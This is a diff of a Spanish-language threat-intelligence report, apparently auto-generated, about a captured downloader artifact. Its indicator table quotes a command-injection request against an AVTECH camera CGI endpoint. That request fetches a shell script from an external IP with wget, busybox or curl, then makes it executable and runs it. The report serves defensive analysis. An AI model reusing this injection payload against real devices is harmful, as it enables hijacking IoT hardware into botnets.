@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (318), with CRLF line terminators de 367 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:51:31+00:00`
+- **Registrado:** `2026-08-09T19:51:31.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -47,11 +48,11 @@ GET /cgi-bin/nobody/Machine.cgi?action=adjust_clock&NtpServer=;cd%20/tmp%3Brm%20
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.169.XXX | static_analysis |
-| ip | 91.92.40.XXX | static_analysis |
 | url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.avtech%3Brm%20-f%20.s;&TimeZone=GMT | strings |
-| hash | e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787 | static_analysis |
+| ip | 91.92.40.XXX | static_analysis |
+| ip | 190.179.169.XXX | static_analysis |
 | command | GET /cgi-bin/nobody/Machine.cgi?action=adjust_clock&NtpServer=;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/wge | strings |
+| hash | e44f00d72aa75b18ead969729ae05a3372345fca392a7318344b7519579e5787 | static_analysis |
 | ip | 45.153.34.XXX | artifact_source |
 
 ## 🔎 Triage
